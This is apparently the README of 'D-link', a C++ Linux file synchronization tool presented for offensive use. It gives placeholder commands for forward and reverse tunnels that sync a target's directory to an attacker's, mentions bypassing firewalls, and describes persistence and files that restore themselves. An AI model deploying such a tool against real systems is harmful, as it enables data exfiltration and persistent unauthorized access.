# D-link

D-link is a lightweight Linux file synchronization tool written in C++.
1. Supports reverse file synchronization operations.
2. Directory monitoring, real-time updates.
3. Access control: Clients are only allowed to automatically upload and delete files, and cannot download sensitive files from the server. Even if synchronized files are deleted from the server, clients will automatically restore them.
4. Client-side deletion of server files.
5. Persistence: Can be used with Tyrant or S-Clustr to form a powerful self-healing network cluster.

# Usage

```
$ ./dlink -h
```

![alt text](pic/image.png)

## D-link Forward Tunnel (Client to Server File Synchronization)

Example: (Real-time synchronization of the target directory to the attacker’s directory)

Server:

![alt text](pic/image-2.png)

```
$ ./dlink server --port <LOCAL-PORT> --path <PATH>
```

![alt text](pic/image-3.png)

Client:

![alt text](pic/image-1.png)

```
$ ./dlink client --endpoint <IP:PORT> --path <PATH>
```

![alt text](pic/image-4.png)

Server:

![alt text](pic/image-5.png)

## D-link Reverse Tunnel (Server to Client File Synchronization)

PS: Typically used to bypass firewalls and prevent data interception.

Example: (Real-time synchronization of the attacker’s directory to the target directory)

Server:

![alt text](pic/image-6.png)

```
$ ./dlink server --port <LOCAL-PORT> --path <PATH> --reverse
```

![alt text](pic/image-7.png)

```
$ ./dlink client --endpoint <IP:PORT> --path <PATH> --reverse
```

![alt text](pic/image-8.png)

![alt text](pic/image-9.png)